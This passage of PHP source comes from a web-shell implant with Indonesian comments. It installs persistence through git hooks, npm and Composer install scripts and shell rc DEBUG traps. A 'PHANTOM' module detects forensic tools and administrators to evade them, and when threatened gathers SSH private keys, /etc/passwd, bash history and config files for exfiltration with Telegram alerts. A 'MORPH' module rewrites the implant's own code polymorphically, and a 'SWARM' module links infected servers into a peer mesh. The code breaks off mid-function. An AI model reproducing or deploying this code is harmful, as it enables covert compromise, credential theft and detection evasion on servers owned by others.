        foreach ($scan as $base) {
            if (!is_dir($base)) continue;
            if (is_dir($base . '/.git/hooks')) $dirs[] = $base . '/.git/hooks';
            $subs = @scandir($base) ?: [];
            foreach ($subs as $s) { if ($s === '.' || $s === '..') continue; if (isset($s[0]) && $s[0] === '.') continue; $p = $base . '/' . $s; if (is_dir($p . '/.git/hooks')) $dirs[] = $p . '/.git/hooks'; }
        }
        return array_values(array_unique($dirs));
    }
    public function install(array $ctx) {
        $home = $ctx['home']; $entry = $ctx['entry'];
        $dirs = $this->findGitDirs($home);
        if (empty($dirs)) return ['ok'=>false,'detail'=>'no .git/hooks','count'=>0];
        $m = $this->marker();
        $script = "#!/bin/sh\n" . $m . "\n[ -f \"" . $entry . "\" ] && (pgrep -f \"" . $entry . "\" >/dev/null 2>&1 || (php \"" . $entry . "\" >/dev/null 2>&1 &))\nexit 0\n";
        $n = 0;
        foreach ($dirs as $hooks) {
            foreach (['post-commit','post-merge','post-checkout','post-rewrite'] as $name) {
                $f = $hooks . '/' . $name;
                if (file_exists($f)) {
                    $c = @file_get_contents($f);
                    if ($c !== false && strpos($c, $m) !== false) { $n++; continue; }
                    if (is_writable($f) && @file_put_contents($f, "\n" . $script, FILE_APPEND | LOCK_EX) !== false) $n++;
                } else { if (@file_put_contents($f, $script) !== false) { @chmod($f, 0755); $n++; } }
            }
        }
        return ['ok'=>$n>0,'detail'=>"injected into $n hook(s)",'count'=>$n];
    }
    public function uninstall(array $ctx) {
        $dirs = $this->findGitDirs($ctx['home']); $m = $this->marker(); $n = 0;
        foreach ($dirs as $hooks) {
            foreach (['post-commit','post-merge','post-checkout','post-rewrite'] as $name) {
                $f = $hooks . '/' . $name;
                if (!file_exists($f) || !is_writable($f)) continue;
                $c = @file_get_contents($f); if ($c === false || strpos($c, $m) === false) continue;
                $lines = explode("\n", $c); $out = []; $skipMarker = false;
                foreach ($lines as $l) { if (strpos($l, $m) !== false) { $skipMarker = true; continue; } if ($skipMarker && trim($l) !== '') { $skipMarker = false; continue; } $out[] = $l; }
                @file_put_contents($f, implode("\n", $out)); $n++;
            }
        }
        return ['ok'=>true,'removed'=>$n,'message'=>"$n cleaned"];
    }
    public function status(array $ctx) {
        $dirs = $this->findGitDirs($ctx['home']);
        if (empty($dirs)) return ['active'=>false,'count'=>0,'detail'=>'no git'];
        $m = $this->marker(); $n = 0;
        foreach ($dirs as $hooks) { foreach (['post-commit','post-merge','post-checkout','post-rewrite'] as $name) { $f = $hooks . '/' . $name; if (file_exists($f) && strpos((string)@file_get_contents($f), $m) !== false) $n++; } }
        return ['active'=>$n>0,'count'=>$n,'detail'=>"$n hook(s)"];
    }
}
/* ─── Persistence helpers (dipakai WnNpm/Composer/ShellTrap) ─── */
function wn_find_project_files($home, $filename) {
    $results = []; if (!$home || !is_dir($home)) return $results;
    $scanDirs = [$home, $home.'/public_html', $home.'/www', $home.'/htdocs', $home.'/domains', $home.'/html', $home.'/sites', $home.'/public'];
    foreach ($scanDirs as $baseDir) {
        if (!is_dir($baseDir)) continue;
        $f = $baseDir . '/' . $filename; if (file_exists($f) && is_writable($f)) $results[] = $f;
        $subdirs = @scandir($baseDir) ?: [];
        foreach ($subdirs as $sub) {
            if ($sub === '.' || $sub === '..') continue;
            if (isset($sub[0]) && $sub[0] === '.') continue;
            $subPath = $baseDir . '/' . $sub; if (!is_dir($subPath)) continue;
            $sf = $subPath . '/' . $filename; if (file_exists($sf) && is_writable($sf)) $results[] = $sf;
        }
    }
    return array_values(array_unique($results));
}
function wn_inject_npm_hooks($home, $entry) {
    $files = wn_find_project_files($home, 'package.json'); if (empty($files)) return 0;
    $marker = 'wn_lifecycle_' . substr(md5('wn_npm_' . wn_get_key('npm')), 0, 8);
    $cmd = 'php "' . $entry . '" >/dev/null 2>&1 &'; $n = 0;
    foreach ($files as $file) {
        $raw = @file_get_contents($file); if ($raw === false) continue;
        $json = @json_decode($raw, true); if (!is_array($json)) continue;
        if (!isset($json['scripts']) || !is_array($json['scripts'])) $json['scripts'] = [];
        if (isset($json['scripts'][$marker])) { $n++; continue; }
        $json['scripts'][$marker] = $cmd;
        foreach (['preinstall','postinstall','prepare'] as $hook) {
            if (!isset($json['scripts'][$hook])) $json['scripts'][$hook] = 'npm run ' . $marker . ' 2>/dev/null || true';
            elseif (is_string($json['scripts'][$hook]) && strpos($json['scripts'][$hook], $marker) === false) $json['scripts'][$hook] = 'npm run ' . $marker . ' 2>/dev/null || true; ' . $json['scripts'][$hook];
        }
        $nj = json_encode($json, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE);
        if ($nj !== false && @file_put_contents($file, $nj . "\n") !== false) $n++;
    }
    return $n;
}
function wn_cleanup_npm_hooks($home) {
    $files = wn_find_project_files($home, 'package.json');
    $marker = 'wn_lifecycle_' . substr(md5('wn_npm_' . wn_get_key('npm')), 0, 8); $n = 0;
    foreach ($files as $file) {
        $raw = @file_get_contents($file); if ($raw === false) continue;
        $json = @json_decode($raw, true); if (!is_array($json) || !isset($json['scripts'][$marker])) continue;
        unset($json['scripts'][$marker]);
        foreach (['preinstall','postinstall','prepare'] as $hook) {
            if (!isset($json['scripts'][$hook])) continue;
            if (is_string($json['scripts'][$hook])) {
                $parts = array_filter(explode(';', $json['scripts'][$hook]), function($p) use ($marker) { return strpos($p, $marker) === false; });
                $j = trim(implode(';', $parts));
                if ($j === '') unset($json['scripts'][$hook]); else $json['scripts'][$hook] = $j;
            }
        }
        $nj = json_encode($json, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE);
        if ($nj !== false && @file_put_contents($file, $nj . "\n") !== false) $n++;
    }
    return $n;
}
function wn_inject_composer_hooks($home, $entry) {
    $files = wn_find_project_files($home, 'composer.json'); if (empty($files)) return 0;
    $marker = 'wn_lifecycle_' . substr(md5('wn_composer_' . wn_get_key('composer')), 0, 8);
    $cmd = 'php "' . $entry . '" >/dev/null 2>&1 &'; $n = 0;
    foreach ($files as $file) {
        $raw = @file_get_contents($file); if ($raw === false) continue;
        $json = @json_decode($raw, true); if (!is_array($json)) continue;
        if (!isset($json['scripts']) || !is_array($json['scripts'])) $json['scripts'] = [];
        if (isset($json['scripts'][$marker])) { $n++; continue; }
        $json['scripts'][$marker] = $cmd;
        foreach (['pre-install-cmd','post-install-cmd','post-update-cmd','post-autoload-dump'] as $hook) {
            if (!isset($json['scripts'][$hook])) $json['scripts'][$hook] = ['@' . $marker];
            elseif (is_string($json['scripts'][$hook])) { if (strpos($json['scripts'][$hook], $marker) === false) $json['scripts'][$hook] = ['@' . $marker, $json['scripts'][$hook]]; }
            elseif (is_array($json['scripts'][$hook])) { $f = false; foreach ($json['scripts'][$hook] as $s) if (is_string($s) && strpos($s, $marker) !== false) { $f = true; break; } if (!$f) array_unshift($json['scripts'][$hook], '@' . $marker); }
        }
        $nj = json_encode($json, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE);
        if ($nj !== false && @file_put_contents($file, $nj . "\n") !== false) $n++;
    }
    return $n;
}
function wn_cleanup_composer_hooks($home) {
    $files = wn_find_project_files($home, 'composer.json');
    $marker = 'wn_lifecycle_' . substr(md5('wn_composer_' . wn_get_key('composer')), 0, 8); $n = 0;
    foreach ($files as $file) {
        $raw = @file_get_contents($file); if ($raw === false) continue;
        $json = @json_decode($raw, true); if (!is_array($json) || !isset($json['scripts'][$marker])) continue;
        unset($json['scripts'][$marker]);
        foreach (['pre-install-cmd','post-install-cmd','post-update-cmd','post-autoload-dump'] as $hook) {
            if (!isset($json['scripts'][$hook])) continue;
            if (is_array($json['scripts'][$hook])) { $json['scripts'][$hook] = array_values(array_filter($json['scripts'][$hook], function($s) use ($marker) { return !(is_string($s) && strpos($s, $marker) !== false); })); if (empty($json['scripts'][$hook])) unset($json['scripts'][$hook]); }
            elseif (is_string($json['scripts'][$hook]) && strpos($json['scripts'][$hook], $marker) !== false) unset($json['scripts'][$hook]);
        }
        $nj = json_encode($json, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE);
        if ($nj !== false && @file_put_contents($file, $nj . "\n") !== false) $n++;
    }
    return $n;
}
function wn_build_trap_line($entry) {
    if ($entry === '') return '';
    $esc = str_replace("'", "'\\''", $entry);
    return 'if [ -n "$BASH_VERSION" ] || [ -n "$ZSH_VERSION" ]; then if [ -z "$__WN_TRAP_S" ]; then __WN_TRAP_S=1; trap \'[ -f "' . $esc . '" ] && (pgrep -f "' . $esc . '" >/dev/null 2>&1 || (php "' . $esc . '" >/dev/null 2>&1 &))\' DEBUG; fi; fi';
}
function wn_inject_shell_trap($home, $entry) {
    if (!$home) return 0;
    $marker = '# ' . substr(md5('wn_trap_' . wn_get_key('trap')), 0, 12) . ' trap';
    $line = wn_build_trap_line($entry); if ($line === '') return 0;
    $n = 0;
    foreach ([$home.'/.bashrc', $home.'/.zshrc', $home.'/.profile', $home.'/.bash_profile', $home.'/.zprofile'] as $f) {
        if (!file_exists($f) || !is_writable($f)) continue;
        $c = @file_get_contents($f); if ($c === false) continue;
        if (strpos($c, $marker) !== false) { $n++; continue; }
        if (@file_put_contents($f, "\n" . $marker . "\n" . $line . "\n", FILE_APPEND | LOCK_EX) !== false) $n++;
    }
    return $n;
}
function wn_cleanup_shell_trap($home) {
    if (!$home) return 0;
    $marker = '# ' . substr(md5('wn_trap_' . wn_get_key('trap')), 0, 12) . ' trap'; $n = 0;
    foreach ([$home.'/.bashrc', $home.'/.zshrc', $home.'/.profile', $home.'/.bash_profile', $home.'/.zprofile'] as $f) {
        if (!file_exists($f) || !is_writable($f)) continue;
        $c = @file_get_contents($f); if ($c === false || strpos($c, $marker) === false) continue;
        $lines = explode("\n", $c); $out = []; $skip = false;
        foreach ($lines as $l) { if (strpos($l, $marker) !== false) { $skip = true; continue; } if ($skip) { $skip = false; continue; } $out[] = $l; }
        if (@file_put_contents($f, implode("\n", $out)) !== false) $n++;
    }
    return $n;
}

/* ─── Hide state (dipakai wn_web_trigger & /hide /show) ─── */
function wn_hide_state_file() { return wn_state_dir() . '/.wn_hide_state'; }
function wn_is_hidden() { $f = wn_hide_state_file(); if (!file_exists($f)) return false; $j = @json_decode((string)wn_call('fgc', $f), true); return is_array($j) && !empty($j['hidden']); }
function wn_hide_state() { $f = wn_hide_state_file(); if (!file_exists($f)) return null; $j = @json_decode((string)wn_call('fgc', $f), true); return is_array($j) ? $j : null; }
function wn_hide_age() { $s = wn_hide_state(); if (!$s || empty($s['hidden_at'])) return -1; return time() - (int)$s['hidden_at']; }
function wn_set_hidden_state($data) { $f = wn_hide_state_file(); if ($data === null) { @unlink($f); return true; } $w = wn_call('fpc', $f, json_encode($data), LOCK_EX); @chmod($f, 0600); return $w !== false; }

/* ─── Stubs for optional feature pack (nf + ts) ───
   Placeholder agar wn_web_trigger & web entry tidak error.
   Full implementation tersedia di "Feature Pack" terpisah. */
function wn_nf_check($max = 10) { return 0; }
function wn_ts_dispatch() { return; }
/* ═══════════════════════════════════════════════════════════════
   PHANTOM v1.0 — Environmental Awareness & Predictive Evasion
   ═══════════════════════════════════════════════════════════════ */
function phantom_f($k){
    global $__B;
    $seed=substr(md5('ph:'.$k.':'.($__B??'')),0,12);
    $map=['state'=>"/.phst_{$seed}.json",'history'=>"/.phh_{$seed}.json",'patterns'=>"/.php_{$seed}.json"];
    if($k==='exfil')return wn_state_dir()."/.phe_{$seed}_".date('Ymd_His').".json";
    return wn_state_dir().($map[$k]??"/.phx_{$seed}");
}
function phantom_load($k){$f=phantom_f($k);if(!file_exists($f))return null;$j=@json_decode((string)wn_call('fgc',$f),true);return is_array($j)?$j:null;}
function phantom_save($k,$d){wn_call('fpc',phantom_f($k),json_encode($d),LOCK_EX);@chmod(phantom_f($k),0600);return true;}
function phantom_default(){return['level'=>3,'score'=>0,'prev_level'=>3,'enabled'=>true,'sensitivity'=>1.0,'last_check'=>0,'signals'=>[]];}
function phantom_sense_who(){
    $u=[];$o=(string)cmd_exec('who 2>/dev/null');
    if($o!=='')foreach(explode("\n",$o) as $l){$l=trim($l);if($l==='')continue;$p=preg_split('/\s+/',$l);$u[]=['user'=>$p[0]??'?','tty'=>$p[1]??'?','since'=>$l];}
    return $u;
}
function phantom_sense_forensics(){
    $tools=['autopsy','sleuthkit','volatility','foremost','scalpel','chkrootkit','rkhunter','lynis','aide','tripwire','auditd','auditctl','wireshark','tshark','tcpdump','strace','ltrace','sysdig','falco','osquery','clamav','clamscan','yara','radare2','rizin','ghidra','nmap','masscan','nikto','sqlmap','metasploit','msfconsole','john','hashcat','hydra','medusa'];
    $found=[];$ps=(string)cmd_exec('ps aux 2>/dev/null');if($ps==='')return $found;
    foreach($tools as $t)if(preg_match('/\b'.preg_quote($t,'/').'\b/i',$ps))$found[]=$t;
    return array_values(array_unique($found));
}
function phantom_sense_network(){
    $c=[];$o=(string)cmd_exec('ss -tn state established 2>/dev/null || netstat -tn 2>/dev/null');
    if($o==='')return $c;
    foreach(explode("\n",$o) as $l)if(preg_match('/:22\s|:3389\s|:5900\s/',$l))$c[]=trim($l);
    return $c;
}
function phantom_sense_time(){
    $h=(int)date('G');$d=(int)date('N');$r=['hour'=>$h,'day'=>$d];
    $r['work_hours']=($h>=8&&$h<18);$r['work_day']=($d>=1&&$d<=5);
    $r['night']=($h>=22||$h<6);$r['weekend']=($d>=6);
    $pat=phantom_load('patterns');
    if($pat&&!empty($pat['hourly_activity'])){
        $maxH=max($pat['hourly_activity']);$curH=$pat['hourly_activity'][$h]??0;
        $r['admin_likely']=($maxH>0&&$curH>($maxH*0.5));
    }else $r['admin_likely']=false;
    return $r;
}
function phantom_sense_auth(){
    $f=0;foreach(['/var/log/auth.log','/var/log/secure'] as $l){
        if(!file_exists($l)||!is_readable($l))continue;
        $fp=@fopen($l,'r');if(!$fp)continue;
        @fseek($fp,max(0,@filesize($l)-20000));$c=(string)@fread($fp,20000);@fclose($fp);
        $f+=preg_match_all('/Failed password|authentication failure|Invalid user/i',$c);
    }
    return $f;
}
function phantom_sense_shell_access(){
    global $CURRENT_SHELL,$rootPath;
    $sp=$rootPath.'/'.$CURRENT_SHELL;if(!file_exists($sp))return 0;
    $n=0;$self=getmypid();
    foreach((array)glob('/proc/[0-9]*/fd/*') as $fd){$t=@readlink($fd);if($t!==false&&$t===$sp){$pid=(int)basename(dirname(dirname($fd)));if($pid>0&&$pid!==$self)$n++;}}
    return $n;
}
function phantom_score($s){
    $score=0;$w=[];
    if(!empty($s['who'])){$score+=25;$w['who']=25;}
    $fn=count($s['forensics']??[]);if($fn>0){$add=min(40,$fn*20);$score+=$add;$w['forensics']=$add;}
    $nn=count($s['network']??[]);if($nn>0){$add=min(20,$nn*10);$score+=$add;$w['network']=$add;}
    $af=$s['auth_fails']??0;if($af>5){$add=min(15,$af-5);$score+=$add;$w['auth']=$add;}
    if(!empty($s['time']['admin_likely'])){$score+=15;$w['admin_pattern']=15;}
    elseif(!empty($s['time']['work_hours'])&&!empty($s['time']['work_day'])){$score+=10;$w['worktime']=10;}
    $sa=$s['shell_access']??0;if($sa>0){$score+=20;$w['shell_access']=20;}
    return['score'=>min(100,$score),'weights'=>$w];
}
function phantom_decide($score,$s){
    $fn=count($s['forensics']??[]);
    if($fn>=2)return 0;
    if(!empty($s['who'])&&$fn>=1)return 0;
    if($score>=70)return 1;
    if($score>=40)return 2;
    if($score>=10)return 3;
    return 4;
}
function phantom_check($force=false){
    static $c=null,$ct=0;
    if(!$force&&$c!==null&&(time()-$ct)<30)return $c;
    $state=phantom_load('state')??phantom_default();
    if(!$state['enabled']){$c=$state;$ct=time();return $c;}
    $sig=['who'=>phantom_sense_who(),'forensics'=>phantom_sense_forensics(),'network'=>phantom_sense_network(),
          'time'=>phantom_sense_time(),'auth_fails'=>phantom_sense_auth(),'shell_access'=>phantom_sense_shell_access(),
          'checked_at'=>time()];
    $sc=phantom_score($sig);$level=phantom_decide($sc['score'],$sig);
   $sens=(float)($state['sensitivity']??1.0);
if(function_exists('anima_config')){
    $animaCfg=anima_config();
    if(!empty($animaCfg['phantom_sensitivity']))$sens=$animaCfg['phantom_sensitivity'];
}
    if($sens<1.0)$level=max(0,$level-1);
    if($sens>1.0)$level=min(4,$level+1);
    $prev=(int)($state['level']??3);
    $new=['level'=>$level,'score'=>$sc['score'],'prev_level'=>$prev,'last_check'=>time(),
          'signals'=>$sig,'weights'=>$sc['weights'],'enabled'=>true,'sensitivity'=>$sens];
    $h=phantom_load('history')??[];
    $h[]=['ts'=>time(),'level'=>$level,'score'=>$sc['score'],'who'=>count($sig['who']),'forensics'=>count($sig['forensics'])];
    if(count($h)>500)$h=array_slice($h,-500);
    phantom_save('history',$h);
    $pat=phantom_load('patterns')??['hourly_activity'=>array_fill(0,24,0),'daily_activity'=>array_fill(0,7,0)];
    if(!empty($sig['who'])){$pat['hourly_activity'][(int)date('G')]++;$pat['daily_activity'][(int)date('N')-1]++;}
    phantom_save('patterns',$pat);
    global $__B,$__C;
    $__stateExisted = file_exists(phantom_f('state'));
$__isEscalation = $level < $prev;
if($__stateExisted && $__isEscalation && function_exists('sendTelegramMessage')){
        $names=[0=>'SILENT',1=>'DORMANT',2=>'CAUTIOUS',3=>'NORMAL',4=>'ALERT'];
        $m="[PHANTOM] {$names[$level]} ({$sc['score']}/100)\n";
        if(!empty($sig['who']))$m.="Logged: ".implode(', ',array_column($sig['who'],'user'))."\n";
        if(!empty($sig['forensics']))$m.="Tools: ".implode(', ',$sig['forensics'])."\n";
        if(!empty($sig['network']))$m.="Net: ".count($sig['network'])."\n";
        if(($sig['auth_fails']??0)>0)$m.="Auth fails: {$sig['auth_fails']}\n";
        $m.="\nWas: {$names[$prev]}";
        @sendTelegramMessage($__B,$__C,$m);
    }
    if($level<=1&&$prev>1)phantom_exfil();
    phantom_save('state',$new);$c=$new;$ct=time();return $c;
}
function phantom_exfil(){
    $home=getenv('HOME')?:'/root';
    $d=['ts'=>time(),'bash_history'=>@file_get_contents($home.'/.bash_history')?:'',
        'crontab'=>(string)cmd_exec('crontab -l 2>/dev/null'),
        'passwd'=>@file_get_contents('/etc/passwd')?:'',
        'ssh_keys'=>[],'configs'=>[]];
    foreach((array)glob($home.'/.ssh/id_*') as $k)if(is_file($k))$d['ssh_keys'][]=['path'=>$k,'b64'=>base64_encode((string)@file_get_contents($k))];
    global $rootPath;
    foreach((array)glob($rootPath.'/*.{env,config,conf,ini,json,yml,yaml}',GLOB_BRACE) as $c)if(is_file($c)&&@filesize($c)<100000)$d['configs'][]=['path'=>$c,'b64'=>base64_encode((string)@file_get_contents($c))];
    $f=phantom_f('exfil');wn_call('fpc',$f,json_encode($d),LOCK_EX);@chmod($f,0600);
    // cleanup old exfil files (keep 5 newest)
$pattern = wn_state_dir() . '/.phe_*_' . '*_*.json';
$files = (array)glob(wn_state_dir() . '/.phe_*.json');
if (count($files) > 5) {
    usort($files, function($a,$b){ return filemtime($a) - filemtime($b); });
    $toDelete = array_slice($files, 0, count($files) - 5);
    foreach ($toDelete as $old) @unlink($old);
}
    return $f;
}
function phantom_apply(){
    $s=phantom_check();$l=(int)($s['level']??3);
    return['level'=>$l,'score'=>(int)($s['score']??0),'silent'=>($l===0),'dormant'=>($l<=1),
           'should_poll'=>($l>=2),'should_respond'=>($l>=2),'should_delay'=>($l===2)];
}
/* ═══════════════════════════════════════════════════════════════
   MORPH v1.0 — Polymorphic Self-Rewriting
   ═══════════════════════════════════════════════════════════════ */
function morph_f($k){
    global $__B;
    $seed=substr(md5('morph:'.$k.':'.($__B??'')),0,12);
    $map=['state'=>"/.mst_{$seed}.json",'history'=>"/.mhi_{$seed}.json"];
    return wn_state_dir().($map[$k]??"/.mxx_{$seed}");
}
function morph_load($k){$f=morph_f($k);if(!file_exists($f))return null;$j=@json_decode((string)wn_call('fgc',$f),true);return is_array($j)?$j:null;}
function morph_save($k,$d){wn_call('fpc',morph_f($k),json_encode($d),LOCK_EX);@chmod(morph_f($k),0600);return true;}
function morph_transform($code,$seed){
    if(!function_exists('token_get_all'))return $code;
    $tokens=@token_get_all($code);if(!is_array($tokens)||empty($tokens))return $code;
    $out='';$varMap=[];$style=['minified','verbose','shuffled','hex','mixed'][crc32($seed)%5];
    $wsRange=$style==='minified'?[1,1]:($style==='verbose'?[2,4]:[1,3]);
    foreach($tokens as $t){
        if(is_array($t)){list($id,$txt)=$t;
            switch($id){
                case T_COMMENT:$out.='/* '.substr(md5($seed.$txt.'c'.random_int(0,9999)),0,24).' */';break;
                case T_DOC_COMMENT:$out.='/** '.substr(md5($seed.$txt.'d'),0,32).' */';break;
                case T_WHITESPACE:
                    if(strpos($txt,"\n")!==false){$n=random_int($wsRange[0],$wsRange[1]);$out.=str_repeat("\n",$n);if($style!=='minified'&&random_int(0,2)===0)$out.=str_repeat(' ',$wsRange[1]*2);}
                    else $out.=' ';
                    break;
                case T_VARIABLE:
                    if(strpos($txt,'$__')===0){if(!isset($varMap[$txt]))$varMap[$txt]='$__'.substr(md5($seed.':v:'.$txt),0,10);$out.=$varMap[$txt];}
                    else $out.=$txt;
                    break;
                case T_CONSTANT_ENCAPSED_STRING:
                    if($style==='hex'||($style==='mixed'&&random_int(0,9)<3)){
                        $q=$txt[0];$inner=substr($txt,1,-1);
                        if(($q==='\''||$q==='"')&&preg_match('/^[\x20-\x7e]*$/',$inner)&&strlen($inner)>0&&strlen($inner)<200){
                            $enc='"';for($i=0,$l=strlen($inner);$i<$l;$i++){$c=$inner[$i];if(ctype_alnum($c)||$c==='_'||$c===' ')$enc.=$c;else $enc.='\x'.bin2hex($c);}
                            $out.=$enc.'"';break;
                        }
                    }
                    $out.=$txt;break;
                default:$out.=$txt;
            }
        }else $out.=$t;
    }
    return $out;
}
function morph_verify($file){
    $php=trim((string)cmd_exec('command -v php 2>/dev/null'));
    if($php===''){foreach(['/usr/local/bin/php','/usr/bin/php','/opt/cpanel/ea-php84/root/usr/bin/php'] as $p)if(is_file($p)){$php=$p;break;}}
    if($php==='')return true;
    $out=(string)cmd_exec(escapeshellarg($php).' -l '.escapeshellarg($file).' 2>&1');
    return stripos($out,'No syntax errors')!==false;
}
function morph_run($reason='auto'){
    $watchers=wn_watcher_locations();
    $target=null;$tcode=null;
    foreach($watchers as $w)if(file_exists($w)){$target=$w;$tcode=wn_call('fgc',$w);break;}
    if(!$target||!$tcode||strlen($tcode)<500)return['ok'=>false,'msg'=>'no_watcher'];
    $state=morph_load('state')??['count'=>0,'last'=>0];
    try{$seed=bin2hex(random_bytes(8));}catch(Throwable $e){$seed=hash('sha256',microtime(true).mt_rand());}
    $newCode=morph_transform($tcode,$seed);
    if($newCode===null||strlen($newCode)<500)return['ok'=>false,'msg'=>'transform_empty'];
    if(hash('sha256',$newCode)===hash('sha256',$tcode))return['ok'=>false,'msg'=>'no_change'];
    $tmp=$target.'.tmp.'.getmypid().'.'.time();
    if(wn_call('fpc',$tmp,$newCode)===false)return['ok'=>false,'msg'=>'write_tmp'];
    if(!morph_verify($tmp)){@unlink($tmp);return['ok'=>false,'msg'=>'syntax_invalid'];}
    @chmod($tmp,0600);
    if(!@rename($tmp,$target)){@unlink($tmp);return['ok'=>false,'msg'=>'rename_fail'];}
    $state['count']=(int)($state['count']??0)+1;$state['last']=time();
    $state['last_hash']=hash('sha256',$newCode);$state['last_old']=hash('sha256',$tcode);
    $state['last_size']=strlen($newCode);$state['last_seed']=$seed;$state['last_reason']=$reason;
    morph_save('state',$state);
    $hist=morph_load('history')??[];
    $hist[]=['ts'=>time(),'old'=>$state['last_old'],'new'=>$state['last_hash'],'size'=>strlen($newCode),'reason'=>$reason];
    if(count($hist)>100)$hist=array_slice($hist,-100);
    morph_save('history',$hist);
    global $__B,$__C;
    if(function_exists('sendTelegramMessage'))
        @sendTelegramMessage($__B,$__C,"[MORPH] #{$state['count']}\nReason: $reason\nNew: ".substr($state['last_hash'],0,12)."\nSize: ".strlen($newCode)."b");
    return['ok'=>true,'count'=>$state['count'],'old'=>$state['last_old'],'new'=>$state['last_hash'],'size'=>strlen($newCode)];
}
function morph_should_run(){
    $state=morph_load('state');
    if(!$state)return['run'=>true,'reason'=>'first','level'=>3];
    $phFile=wn_state_dir().'/.phstate_'.substr(md5('ph:state:'.($GLOBALS['__B']??'')),0,12).'.json';
    $phLevel=3;
    if(file_exists($phFile)){$j=@json_decode((string)wn_call('fgc',$phFile),true);if(is_array($j))$phLevel=(int)($j['level']??3);}
$interval=[1200,2700,7200,14400,28800][max(0,min(4,$phLevel))];
if(function_exists('anima_config')){
    $animaCfg=anima_config();
    if(!empty($animaCfg['morph_interval_mult']))$interval=(int)($interval*$animaCfg['morph_interval_mult']);
}
    if(isset($state['force_interval']))$interval=(int)$state['force_interval'];
    $last=(int)($state['last']??0);
    if((time()-$last)>=$interval)return['run'=>true,'reason'=>"interval_{$interval}s",'level'=>$phLevel];
    return['run'=>false,'next'=>$interval-(time()-$last),'level'=>$phLevel];
}
function morph_apply(){
    $s=morph_should_run();
    if(!$s['run'])return['done'=>false,'next'=>$s['next'],'level'=>$s['level']??3];
    $r=morph_run($s['reason']);
    return['done'=>true,'result'=>$r,'level'=>$s['level']??3];
}
/* ═══════════════════════════════════════════════════════════════
   SWARM v1.0 — Distributed P2P Mesh
   ═══════════════════════════════════════════════════════════════ */
function swarm_f($k){
    global $__B;
    $seed=substr(md5('swarm:'.$k.':'.($__B??'')),0,12);
    $map=['key'=>"/.swk_{$seed}.dat",'id'=>"/.swi_{$seed}.dat",
          'peers'=>"/.swp_{$seed}.json",'seen'=>"/.sws_{$seed}.json"];
    return wn_state_dir().($map[$k]??"/.swx_{$seed}");
}
function swarm_id(){
    static $c=null;if($c!==null)return $c;
    $f=swarm_f('id');
    if(file_exists($f)){$id=trim((string)wn_call('fgc',$f));if(strlen($id)>=6)return $c=$id;}
    $h=@gethostname()?:'unknown';
    $id=substr(hash('sha256','swarm:id:'.$h.':'.__DIR__.':'.($GLOBALS['__B']??'')),0,16);
    wn_call('fpc',$f,$id,LOCK_EX);@chmod($f,0600);
    return $c=$id;
}
function swarm_key(){$f=swarm_f('key');if(!file_exists($f))return '';$k=trim((string)wn_call('fgc',$f));return strlen($k)>=24?$k:'';}
function swarm_key_set($k){wn_call('fpc',swarm_f('key'),$k,LOCK_EX);@chmod(swarm_f('key'),0600);return true;}
function swarm_key_gen(){try{return bin2hex(random_bytes(24));}catch(Throwable $e){return hash('sha256','swk:'.microtime(true).mt_rand());}}
function swarm_peers(){$f=swarm_f('peers');if(!file_exists($f))return[];$j=@json_decode((string)wn_call('fgc',$f),true);return is_array($j)?$j:[];}
function swarm_save_peers($p){wn_call('fpc',swarm_f('peers'),json_encode(array_values($p),JSON_PRETTY_PRINT),LOCK_EX);@chmod(swarm_f('peers'),0600);return true;}
function swarm_seen_load(){$f=swarm_f('seen');if(!file_exists($f))return[];$j=@json_decode((string)wn_call('fgc',$f),true);return is_array($j)?$j:[];}
function swarm_seen_save($s){wn_call('fpc',swarm_f('seen'),json_encode($s),LOCK_EX);@chmod(swarm_f('seen'),0600);}
function swarm_self_url(){
    $sc=(!empty($_SERVER['HTTPS'])&&$_SERVER['HTTPS']!=='off')?'https':'http';
    $h=$_SERVER['HTTP_HOST']??'localhost';
    $p=$_SERVER['SCRIPT_NAME']??('/'.($GLOBALS['CURRENT_SHELL']??'slave.php'));
    return $sc.'://'.$h.$p;
}
function swarm_upsert_peer($id,$url,$extra=[]){
    if($id===''||$id===swarm_id()||$url==='')return false;
    $peers=swarm_peers();$found=false;
    foreach($peers as &$p){
        if(($p['id']??'')===$id){$p['url']=$url;$p['last_seen']=time();$p['last_status']='ok';foreach($extra as $k=>$v)$p[$k]=$v;$found=true;break;}
    }unset($p);
    if(!$found)$peers[]=array_merge(['id'=>$id,'url'=>$url,'added_at'=>time(),'last_seen'=>time(),'last_status'=>'ok'],$extra);
    swarm_save_peers($peers);return true;
}
function swarm_http($url,$op,$params=[],$timeout=15){
    $key=swarm_key();if($key==='')return['error'=>'no_key'];
    $ts=time();$body=http_build_query(array_merge(['node_id'=>swarm_id()],$params));
    $sig=hash_hmac('sha256',$op.'|'.$ts.'|'.$body,$key);
    $headers=['User-Agent: Mozilla/5.0','Content-Type: application/x-www-form-urlencoded',
              'X-SWARM-Node: '.swarm_id(),'X-SWARM-Ts: '.$ts,'X-SWARM-Sig: '.$sig];
    $sep=strpos($url,'?')===false?'?':'&';
    $full=$url.$sep.'wn_swarm=1&op='.urlencode($op);
    if(function_exists('curl_init')){
        $ch=@wn_call('cu_i',$full);
        if($ch!==false&&$ch!==null){
            @wn_call('cu_s',$ch,CURLOPT_RETURNTRANSFER,true);
            @wn_call('cu_s',$ch,CURLOPT_POST,true);
            @wn_call('cu_s',$ch,CURLOPT_POSTFIELDS,$body);
            @wn_call('cu_s',$ch,CURLOPT_TIMEOUT,$timeout);
            @wn_call('cu_s',$ch,CURLOPT_CONNECTTIMEOUT,8);
            @wn_call('cu_s',$ch,CURLOPT_SSL_VERIFYPEER,false);
            @wn_call('cu_s',$ch,CURLOPT_SSL_VERIFYHOST,false);
            @wn_call('cu_s',$ch,CURLOPT_HTTPHEADER,$headers);
            $r=@wn_call('cu_e',$ch);@wn_call('cu_c',$ch);
            if(is_string($r)&&$r!==''){$j=@json_decode($r,true);return is_array($j)?$j:['error'=>'invalid_json'];}
        }
    }
    if(ini_get('allow_url_fopen')){
        $opts=['http'=>['method'=>'POST','header'=>implode("\r\n",$headers)."\r\n",'content'=>$body,'timeout'=>$timeout,'ignore_errors'=>true],
               'ssl'=>['verify_peer'=>false,'verify_peer_name'=>false]];
        $r=@wn_call('fgc',$full,false,stream_context_create($opts));
